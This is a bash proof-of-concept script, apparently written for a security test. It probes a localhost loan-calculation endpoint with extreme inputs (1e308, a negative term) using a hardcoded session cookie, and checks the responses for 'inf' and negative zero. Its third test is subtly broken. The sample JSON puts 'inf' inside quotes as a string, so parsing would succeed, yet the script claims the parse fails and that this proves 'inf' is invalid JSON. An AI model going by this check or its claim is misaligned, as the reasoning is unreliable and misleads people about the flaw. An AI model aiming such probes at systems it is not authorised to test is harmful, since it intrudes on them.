#!/bin/bash

# POC: Input Validation Flaw - Infinity Values in Loan Calculations
# Tests the /total_loan_payments endpoint for improper handling of extreme values

TARGET_URL="http://localhost:80"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ41ow.dATezR6aFvM2xLzH7fFEw5nANQc"

echo "============================================"
echo "POC: Infinity Values in Loan Calculations"
echo "============================================"
echo ""

# Test 1: Infinity calculation with scientific notation
echo "[TEST 1] Testing infinity calculation with 1e308 payment value"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET_URL/total_loan_payments?principal=100000&payment=1e308&term=30'"
echo ""

RESPONSE1=$(curl -s -b "$SESSION_COOKIE" "$TARGET_URL/total_loan_payments?principal=100000&payment=1e308&term=30")
echo "Response:"
echo "$RESPONSE1"
echo ""

# Check if response contains 'inf' (invalid JSON)
if echo "$RESPONSE1" | grep -q "inf"; then
    echo "✓ VULNERABILITY CONFIRMED: Response contains 'inf' (invalid JSON)"
    echo "  This will break strict JSON parsers in JavaScript"
else
    echo "✗ Test 1 failed: No 'inf' value found"
fi
echo ""

# Test 2: Negative zero edge case
echo "[TEST 2] Testing negative zero with term=-1"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET_URL/total_loan_payments?principal=100000&payment=0&term=-1'"
echo ""

RESPONSE2=$(curl -s -b "$SESSION_COOKIE" "$TARGET_URL/total_loan_payments?principal=100000&payment=0&term=-1")
echo "Response:"
echo "$RESPONSE2"
echo ""

# Check if response contains '-0.0'
if echo "$RESPONSE2" | grep -q "\-0\.0"; then
    echo "✓ VULNERABILITY CONFIRMED: Response contains '-0.0' (edge case)"
    echo "  Negative zero is a floating-point edge case that violates business logic"
else
    echo "✗ Test 2 failed: No '-0.0' value found"
fi
echo ""

# Test 3: Verify JSON parsing fails with standard tools
echo "[TEST 3] Attempting to parse response with Python JSON parser"
echo ""

# Try to parse the infinity response with Python
python3 << 'EOF' 2>&1
import json
import sys

response = '{"loan_principal": "100000", "monthly_payment": "1e+308", "loan_term_amount": "30", "total_loan_payments": "inf"}'

print(f"Attempting to parse: {response}")
try:
    parsed = json.loads(response)
    print("✗ JSON parsing succeeded (unexpected)")
except json.JSONDecodeError as e:
    print(f"✓ JSON parsing FAILED: {e}")
    print("  This confirms that 'inf' is invalid JSON")
EOF

echo ""
echo "============================================"
echo "POC Complete"
echo "============================================"